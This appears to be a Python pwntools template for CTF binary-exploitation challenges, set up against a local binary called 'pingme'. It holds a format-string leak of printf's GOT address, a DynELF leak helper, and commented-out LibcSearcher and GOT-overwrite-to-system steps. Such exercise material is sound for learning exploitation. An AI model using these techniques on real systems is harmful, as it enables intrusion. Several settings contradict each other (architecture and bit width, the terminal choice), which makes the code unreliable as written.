
## pwn题模板

```py
from pwn import * 
import os
# ========================================
is_debug = False
is_debug = True
architecture = {"arch":"i386","os":"linux","endian":"little","bits":64}
architecture = {"arch":"amd64","os":"linux","endian":"little","bits":32}
# is_remote = True
is_remote = False
ip = ""
port = ""
target = "./pingme"
target_libc = ""
env = []

# ========================================
def _which(p):
    return os.system("which " + p + " >/dev/null 2>&1") == 0



# ========================================
if is_debug:
    context.log_level='debug'
else:
    context.log_level='info'
context(os=architecture["os"],arch=architecture["arch"],bits=architecture["bits"])
elf = ""
libc = ""
if target:
    context.binary = target
    elf = ELF(target)
if target_libc:
    libc = ELF(target_libc)

if _which("tmux"):
    terminal = ['tmux', 'splitw', '-h']
elif _which('gnome-terminal'):
    terminal = ['tmux', '--', 'sh', '-c']
else:
    terminal = None
context.terminal = terminal

if is_remote:
    while True:
        try:
            io=remote(ip,port)
        except:
            log.info("remote:too many requests,I am tried,sleep one second please")
            sleep(0x10)
            continue
        break
else:
    while True:
        try:
            io=process(target)
        except:
            log.info("local:too many process,I can not malloc any memory")
            log.info("bye~~")
            exit()
        break

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        if stop:
            pause()
        gdb.attach(io, gdbscript=gdbscript)

stop = pause
S = pause
leak = lambda name, address: log.info("{{}} ===> {{}}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

buffer_padding = lambda offset : offset*'A'

def exec_fmt(payload):
    io.sendline(payload)
    info = io.recv()
    return info
# auto = FmtStr(exec_fmt)
# offset = auto.offset
# fmtstr_payload(7, {printf_got: system_addr})

def DynELF_leak(addr):
    p = process(target)
    p.recvline()
    payload = b"%9$s.AAA" + p32(addr)
    p.sendline(payload)
    data = p.recvuntil(".AAA")[:-4] 
    log.info("leaking: 0x%x --> %s" % (addr, data.hex()))
    p.close()
    return data
# data = DynELF(DynELF_leak, elf.plt["printf"],elf=elf)     # Entry point address
# system_addr = data.lookup('system', 'libc')
# printf_addr = data.lookup('printf', 'libc')
# log.info("system address: 0x%x" % system_addr)
# log.info("printf address: 0x%x" % printf_addr)


from LibcSearcher import LibcSearcher
# libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)
# libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')
# system_addr = libcbase + libc_searcher.dump('system')
# binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')
# libc_searcher = LibcSearcher('printf', printf_addr)
# libcbase = printf_addr - libc_searcher.dump('printf')
# system_addr = libcbase + libc_searcher.dump('system')

# ========================================


S()


# debug(gdbscript="b *main\r\nb printf")
# print(hex(elf.got["printf"]))
printf_got = elf.got["printf"]
payload = b"%9$s.AAA" + p32(printf_got)
rl()
sl(payload)
data = ru(".AAA")[:4]
printf_addr = u32(data)
log.info("printf address: %s" % hex(printf_addr))


ia()
# S()
```